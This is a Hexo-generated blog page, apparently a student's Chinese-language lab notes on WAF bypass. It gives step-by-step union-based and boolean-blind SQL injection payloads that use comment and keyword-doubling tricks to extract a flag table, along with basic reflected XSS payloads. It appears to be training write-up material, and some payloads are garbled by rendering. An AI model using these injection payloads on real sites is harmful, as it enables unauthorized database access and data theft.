@@ -1,0 +1,93 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="WAF绕过基础实验"><meta name="keywords" content><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>WAF绕过基础实验 | Hexo</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2019-07-29实验笔记"><span class="toc-number">1.</span> <span class="toc-text">2019/07/29实验笔记</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">13</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Hexo</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">WAF绕过基础实验</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-08-19</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="2019-07-29实验笔记"><a href="#2019-07-29实验笔记" class="headerlink" title="2019/07/29实验笔记"></a>2019/07/29实验笔记</h2><p>通过报错和反馈逐步分析到底过滤了什么东西，从而绕过WAF。</p>
+<a id="more"></a>
+
+<p>任务1：简单是SQL注入1</p>
+<p>1、判断服务器接收的字符类型</p>
+<p>依次输入1    1’      1’’</p>
+<p><img src="http://wx4.sinaimg.cn/large/0078H38igy1g64pcef388j306l03ljrl.jpg" alt="img"><img src="http://ws2.sinaimg.cn/large/0078H38igy1g64pcj1d4cj308k03n3yk.jpg" alt="img"><img src="http://ws3.sinaimg.cn/large/0078H38igy1g64pcp6f7hj308u03caa6.jpg" alt="img"> </p>
+<p>由此可知为字符型</p>
+<p>2、爆库</p>
+<p>-1’/<strong>/union/</strong>/select/<strong>/databasae()/</strong>/‘</p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g64pcx1d4tj30ac03g74m.jpg" alt="img"> </p>
+<p>3、爆表</p>
+<p>-1’/<strong>/union/</strong>/select/**/</p>
+<p>(select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/<strong>/table_sctable_schemahema=database()/</strong>/limit/<strong>/0,1)/</strong>/‘  </p>
+<p><img src="http://wx4.sinaimg.cn/large/0078H38igy1g64pd5caruj3092056gm4.jpg" alt="img"> </p>
+<p>4、爆字段</p>
+<p> -1’/<strong>/union/</strong>/select/**/</p>
+<p>(select/<strong>/column_namcolumn_namee/</strong>/from/<strong>/information_scheminformation_schema.columnsa.columns/</strong>/where/<strong>/table_sctable_schemahema=’web1’/</strong>/and/<strong>/table_name=’flag’/</strong>/limit/<strong>/0,1)/</strong>/‘ </p>
+<p><img src="http://wx3.sinaimg.cn/large/0078H38igy1g64pd9swf4j30aw03qjrn.jpg" alt="img"> </p>
+<p>这里是服务器的问题，不过好在根据题目知道字段名为flag</p>
+<p>5、爆数据</p>
+<p>-1’ union/<strong>/select/</strong>/flag from/<strong>/web1.flag where/</strong>/‘1’=’1 </p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g64pdjfazij30e205imxy.jpg" alt="img"> </p>
+<p>任务2：简单SQL注入2</p>
+<p>1、测试服务器接收数据类型</p>
+<p>依次输入1    1’      1’’</p>
+<p><img src="http://ws1.sinaimg.cn/large/0078H38igy1g64pdqx34oj306l03ljrl.jpg" alt="img"><img src="http://wx4.sinaimg.cn/large/0078H38igy1g64pdx8n1oj308k03n3yk.jpg" alt="img"><img src="http://wx3.sinaimg.cn/large/0078H38igy1g64pea4sjhj308u03caa6.jpg" alt="img"> </p>
+<p>由此可知为字符型</p>
+<p>2、爆库</p>
+<p>-1’/<strong>/union/</strong>/select/<strong>/databasae()/</strong>/‘</p>
+<p><img src="http://ws1.sinaimg.cn/large/0078H38igy1g64pefs8i0j30am03pmxh.jpg" alt="img"> </p>
+<p>3、爆表</p>
+<p>-1’/<strong>/union/</strong>/select/**/</p>
+<p>(select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/<strong>/table_schema=database()/</strong>/limit/<strong>/0,1)/</strong>/‘</p>
+<p><img src="http://ws2.sinaimg.cn/large/0078H38igy1g64pemvu73j3076047mxj.jpg" alt="img"> </p>
+<p>4、爆字段</p>
+<p>-1’/<strong>/union/</strong>/select/**/</p>
+<p>(select/<strong>/column_name/</strong>/from/<strong>/information_schema.columns/</strong>/where/<strong>/table_schema=database()/</strong>/and/<strong>/table_name/</strong>/limit/<strong>/0,1)/</strong>/‘</p>
+<p>服务器无反应，但是已经知道是求flag的值</p>
+<p>5、爆数据</p>
+<p>-1’/<strong>/union/</strong>/select/<strong>/flag/</strong>/from/<strong>/web1.flag/</strong>/where/**/‘1’=’1</p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g64perzz5tj307v044dgd.jpg" alt="img"> </p>
+<p>任务3：简单SQL注入3</p>
+<p>1、测试服务器接收数据类型</p>
+<p>依次输入1    1’      1’’</p>
+<p><img src="http://wx1.sinaimg.cn/large/0078H38igy1g64pey3n61j3080025t8p.jpg" alt="img"><img src="http://wx1.sinaimg.cn/large/0078H38igy1g64pfkeu6gj307u02cq32.jpg" alt="img"><img src="http://ws3.sinaimg.cn/large/0078H38igy1g64pfpc6bmj309d02t74d.jpg" alt="img"> </p>
+<p>2、爆库</p>
+<p>1’ and substr(database(),1,1)=’x</p>
+<p>使用burpsuite抓包，进行攻击</p>
+<p><img src="http://ws1.sinaimg.cn/large/0078H38igy1g64pgbfkx4j30fe0230sy.jpg" alt="img"> </p>
+<p>依次爆出可得库名是web1</p>
+<p>3、爆表</p>
+<p>1’ and substr((select table_name from information_schema.tables where table_schema=’web1’ limit 0,1),1,1)=’x</p>
+<p>使用burpsuite抓包，进行攻击</p>
+<p><img src="http://ws1.sinaimg.cn/large/0078H38igy1g64pgh2qkyj30dw019glo.jpg" alt="img"> </p>
+<p>依次可得表名为flag</p>
+<p>4、爆字段</p>
+<p>1’ and substr((select column_name from information_schema.columns where table_schema=’web1’ and table_name=’flag’ limit 0,1),1,1)=’x</p>
+<p>这里服务器有问题，但已知要求的是flag的值</p>
+<p>5、爆数据</p>
+<p>1’ and substr((select flag from web1.flag limit 0,1),1,1)=’</p>
+<p>上面的方法太麻烦</p>
+<p>选择使用sqlmap跑出flag的值</p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g64pgn10u1j309v03qq3h.jpg" alt="img"> </p>
+<p>任务4：反射型XSS低级</p>
+<p>1、找到注入点</p>
+<p><img src="http://ws4.sinaimg.cn/large/0078H38igy1g64pgt7kugj308x01pdg2.jpg" alt="img"> </p>
+<p>2、构建注入语法”&gt;<script>alert(1)</script></p>
+<p><img src="http://ws3.sinaimg.cn/large/0078H38igy1g64pgxwz2bj30ar05jgln.jpg" alt="img"> </p>
+<p>任务5：反射型XSS中级</p>
+<p>1、确定注入点</p>
+<p>2、构建注入语法</p>
+<p>“&gt;<script>alert(1)</script></p>
+<p><img src="http://ws1.sinaimg.cn/large/0078H38igy1g64ph3wmvtj30ai05x3yo.jpg" alt="img"> </p>
+<p>任务6：高级反射型XSS</p>
+<p>1、确定注入点</p>
+<p>2、构建注入语法</p>
+<p>&lt;img src=# onerror=alert(“xss”)&gt;</p>
+<p><img src="http://ws1.sinaimg.cn/large/0078H38igy1g64ph9o351j30dh03wgls.jpg" alt="img"> </p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2019/08/19/WAF绕过/">http://yoursite.com/2019/08/19/WAF绕过/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="next-post pull-right"><a href="/2019/08/17/堆叠，二次，宽字符，cookie注入/"><span>简单的堆叠、二次、宽字符、cookie注入</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2019 By John Doe</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
